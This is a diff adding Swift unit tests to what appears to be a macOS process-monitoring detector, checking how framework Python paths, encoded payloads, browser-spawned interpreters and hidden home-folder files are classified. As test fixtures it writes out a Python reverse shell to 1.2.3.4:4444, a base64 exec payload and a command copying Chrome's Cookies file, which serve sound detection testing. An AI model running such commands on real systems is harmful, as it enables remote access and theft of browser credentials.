@@ -156,6 +156,68 @@ final class SentinelRulesTests: XCTestCase {
         }
     }
 
+    // MARK: - Python behind its framework app
+
+    /// python3 from Xcode, the Command Line Tools, python.org and Homebrew all become
+    /// `Python.app/Contents/MacOS/Python`, so the kernel reports an app-bundle path.
+    private let frameworkPythons = [
+        "/Library/Developer/CommandLineTools/Library/Frameworks/Python3.framework/Versions/3.9/Resources/Python.app/Contents/MacOS/Python",
+        "/Applications/Xcode.app/Contents/Developer/Library/Frameworks/Python3.framework/Versions/3.9/Resources/Python.app/Contents/MacOS/Python",
+        "/Applications/Xcode-beta.app/Contents/Developer/Library/Frameworks/Python3.framework/Versions/3.9/Resources/Python.app/Contents/MacOS/Python",
+        "/Library/Frameworks/Python.framework/Versions/3.14/Resources/Python.app/Contents/MacOS/Python",
+        "/opt/homebrew/Cellar/python@3.13/3.13.5/Frameworks/Python.framework/Versions/3.13/Resources/Python.app/Contents/MacOS/Python",
+    ]
+
+    func testFrameworkPythonIsTheInterpreterButAnAppsBundledRunnerIsNot() {
+        for path in frameworkPythons {
+            XCTAssertTrue(SentinelCatalog.isCommandRunner("Python", path: path), path)
+        }
+        for path in ["/Applications/Slack.app/Contents/Frameworks/Slack Helper.app/Contents/MacOS/node",
+                     "/Applications/Foo.app/Contents/Frameworks/Python.framework/Versions/3.11/Resources/Python.app/Contents/MacOS/Python",
+                     "/Applications/Foo.app/Contents/Resources/Python.app/Contents/MacOS/Python"] {
+            XCTAssertFalse(SentinelCatalog.isCommandRunner((path as NSString).lastPathComponent, path: path), path)
+        }
+        XCTAssertFalse(SentinelCatalog.isCommandRunner("Python", path: "/Applications/Python 3.14/IDLE.app/Contents/MacOS/Python"),
+                       "IDLE's launcher is a different app, not the interpreter's framework app")
+    }
+
+    func testEncodedPayloadInFrameworkPythonIsSeen() {
+        for path in frameworkPythons {
+            let python = subject("Python", path: path,
+                                 command: path + " -c exec(__import__('base64').b64decode('aW1wb3J0IG9z'))")
+            XCTAssertTrue(kinds(evaluate(python), atLeast: .suspicious).contains(.encodedPayload), path)
+        }
+    }
+
+    func testBrowserStartingFrameworkPythonIsReported() {
+        let browser = subject("Google Chrome", path: chrome)
+        for path in frameworkPythons {
+            let python = subject("Python", path: path, command: path + " -c print(1)", parent: browser.identity.pid)
+            XCTAssertTrue(kinds(evaluate(python, ancestors: [browser])).contains(.appSpawnedShell), path)
+        }
+    }
+
+    func testFrameworkPythonReverseShellAndCookieCopyAreDangerous() {
+        let path = frameworkPythons[1]
+        let shell = subject("Python", path: path,
+                            command: #"\#(path) -c import socket,subprocess,os;s=socket.socket();s.connect(("1.2.3.4",4444));os.dup2(s.fileno(),0)"#)
+        XCTAssertTrue(kinds(evaluate(shell), atLeast: .dangerous).contains(.reverseShell))
+        let copy = subject("Python", path: path,
+                           command: "\(path) -c import shutil; shutil.copy('/Users/me/Library/Application Support/Google/Chrome/Default/Cookies', '/tmp/c')")
+        XCTAssertTrue(kinds(evaluate(copy), atLeast: .dangerous).contains(.credentialAccess))
+    }
+
+    func testEverydayFrameworkPythonWorkStaysQuiet() {
+        let app = subject("Terminal", path: terminal)
+        let shell = subject("-zsh", path: "/bin/zsh", command: "-zsh", parent: app.identity.pid)
+        for path in frameworkPythons {
+            for arguments in ["-m http.server 8000", "manage.py runserver", "-m pytest tests", "-m venv .venv"] {
+                let python = subject("Python", path: path, command: "\(path) \(arguments)", parent: shell.identity.pid)
+                XCTAssertLessThan(evaluate(python, ancestors: [shell, app]).severity, .notable, "\(arguments) via \(path)")
+            }
+        }
+    }
+
     func testChatAppStartingAShellIsOnlyNotable() {
         let slack = subject("Slack", path: "/Applications/Slack.app/Contents/MacOS/Slack")
         let shell = subject("sh", path: "/bin/sh", command: "sh -c ls", parent: slack.identity.pid)
@@ -167,6 +229,19 @@ final class SentinelRulesTests: XCTestCase {
         XCTAssertFalse(SentinelRules.isHiddenUserPath("/users/me/.local/bin/uv"))
         XCTAssertTrue(SentinelRules.isHiddenUserPath("/users/me/.xq/agent"))
         XCTAssertTrue(SentinelRules.isHiddenUserPath("/users/me/library/application support/.sync/helper"))
+    }
+
+    func testAHiddenFileDirectlyInTheHomeFolderIsHidden() {
+        XCTAssertTrue(SentinelRules.isHiddenUserPath("/users/me/.helper"))
+        XCTAssertTrue(SentinelRules.isHiddenUserPath("/users/me/.mainhelper"))
+        XCTAssertFalse(SentinelRules.isHiddenUserPath("/users/me/helper"))
+        XCTAssertFalse(SentinelRules.isHiddenUserPath("/users/.helper"), "no home folder in that path")
+        for known in ["/users/me/.foundry/bin/anvil", "/users/me/.opencode/bin/opencode", "/users/me/.lmstudio/bin/lms",
+                      "/users/me/.pub-cache/bin/melos", "/users/me/.rvm/bin/ruby"] {
+            XCTAssertFalse(SentinelRules.isHiddenUserPath(known), known)
+        }
+        let result = evaluate(subject("helper", path: "/Users/me/.helper"))
+        XCTAssertEqual(result.signals.first { $0.kind == .hiddenLocation }?.severity, .notable, "\(result.signals)")
     }
 
     func testEvidenceKeepsOriginalCapitalisation() {
